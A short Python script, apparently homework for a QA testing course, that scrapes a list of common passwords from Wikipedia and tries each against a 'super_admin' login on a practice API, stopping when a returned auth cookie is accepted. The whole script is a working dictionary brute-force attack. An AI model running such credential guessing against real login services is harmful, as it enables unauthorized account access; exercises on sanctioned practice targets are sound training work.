import json
import requests
from bs4 import BeautifulSoup
import re

print('Please wait.')

# Формируем список паролей
resp_wiki = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')
html = resp_wiki.text
parsed_html = BeautifulSoup(html, features="lxml")
c = parsed_html.body.find_all('td', attrs={'align':'left'})

content = []
res = [] # Хранилище паролей

for i in c:
    content.append(str(i))
for c in content:
    r = re.findall(r'\w+', c)
    res.append(r[3])
#print(res)

# Обращаемся к апи и перебираем связку логин/пароль
for p in res:
    info = {"login": "super_admin", "password": p}
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=info)

    rc = {"auth_cookie": response.cookies.get('auth_cookie')}

    response_cookie = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=rc)

    if response_cookie.text == "You are NOT authorized":
        continue
    else:
        print(f'Значение найденного куки: {response.cookies.values()} с текстом: {response_cookie.text} и паролем: {p}')
        break